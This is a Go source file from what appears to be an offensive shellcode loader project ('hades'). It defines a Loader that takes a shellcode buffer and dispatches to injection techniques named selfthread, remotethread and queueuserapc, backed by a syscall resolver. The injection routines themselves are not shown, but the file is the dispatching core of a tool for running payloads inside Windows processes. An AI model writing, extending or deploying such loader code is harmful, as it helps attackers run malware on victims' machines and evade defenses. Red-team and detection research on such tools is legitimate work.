package loader

import (
	"fmt"

	"github.com/f1zm0/hades/internal/resolver"
)

type Loader interface {
	Load(scBuf []byte, technique string) error
}

type loader struct {
	resolver resolver.Resolver
}

var _ Loader = (*loader)(nil)

func NewLoader() (Loader, error) {
	r, err := resolver.NewResolver()
	if err != nil {
		return nil, err
	}
	pl := &loader{
		resolver: r,
	}

	return pl, nil
}

func (ldr *loader) Load(scBuf []byte, technique string) error {
	switch technique {
	case "selfthread":
		return ldr.selfInjectThread(scBuf)
	case "remotethread":
		return ldr.remoteThreadInject(scBuf)
	case "queueuserapc":
		return ldr.queueUserAPC(scBuf)
	default:
		fmt.Printf("[!] Invalid technique %s", technique)
	}
	return nil
}
